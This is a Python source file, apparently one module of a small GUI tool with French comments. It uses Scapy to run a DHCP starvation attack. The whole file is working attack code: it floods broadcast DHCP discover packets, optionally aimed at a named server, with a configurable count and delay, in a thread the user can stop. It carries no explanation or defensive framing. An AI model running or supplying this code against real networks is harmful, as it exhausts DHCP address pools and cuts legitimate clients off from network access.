import time
import random
import threading
from scapy.all import *
import dhcp_starvation_graphique
import sys

class dhcp_starvation(threading.Thread):


	def __init__(self,ip_src,nombre,attente,interface):
		conf.checkIpAddr=False
		threading.Thread.__init__(self)
		self.stopper=threading.Event()

		##COPY DE L'ADRESSE IP SOURCE
		self.ip_src=ip_src

		
		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface not chosen automatically")
			conf.iface=interface
		else:
			print("interface chosen automatically")

		if(interface != ""):
			print("PACKETS SENDING INTERFACE:"+interface)
		else:
			print("PACKETS SENDING INTERFACE:"+conf.iface)
			
		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)


	def run(self):	
		
		if(dhcp_starvation_graphique.verrou.locked()):
			print("\n ERROR ANOTHER ATTACK IN PROGRESS DETECTED")

		else:
			print("\n NO ATTACK IN PROGRESS DETECTED\n")

			dhcp_starvation_graphique.verrou.acquire()

			print("\n Starting the Attack DHCP STARVATION --"+time.ctime()+"\n")
			self.ether=Ether(dst="ff:ff:ff:ff:ff:ff")
			self.ip=IP(src="0.0.0.0", dst="255.255.255.255")
			self.udp=UDP(sport=68, dport=67)
			self.bootp=BOOTP(chaddr=RandString(12, '0123456789abcdef'))
			self.i=0
			

			if(self.ip_src==""):			

				self.dhcp=DHCP(options=[("message-type", "discover"),("end")])

				self.paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
				
				self.paquet.show()
				
				time.sleep(3)
	
				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
		
						'''CREATION DU PAQUET'''
						
					
						sendp(self.paquet)
						time.sleep(self.delai)
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
		
						'''CREATION DU PAQUET'''
						paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
					
						sendp(paquet)
						time.sleep(self.delai)
						if(self.stopper.isSet()):
							break
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			else:
				self.dhcp=DHCP(options=[("message-type", "discover"),("server_id", self.ip_src),"end"])

				self.paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
				
				self.paquet.show()
			
				time.sleep(3)

				if(self.n == -1):

					while(1==1 and not(self.stopper.isSet())):
		
						'''CREATION DU PAQUET'''
					
						sendp(self.paquet)
						time.sleep(self.delai)
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
		
						'''CREATION DU PAQUET'''
						paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
					
						sendp(paquet)
						time.sleep(self.delai)
						if(self.stopper.isSet()):
							break
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			dhcp_starvation_graphique.verrou.release()

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		self.stopper.set()
	
	def randommac(self):
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
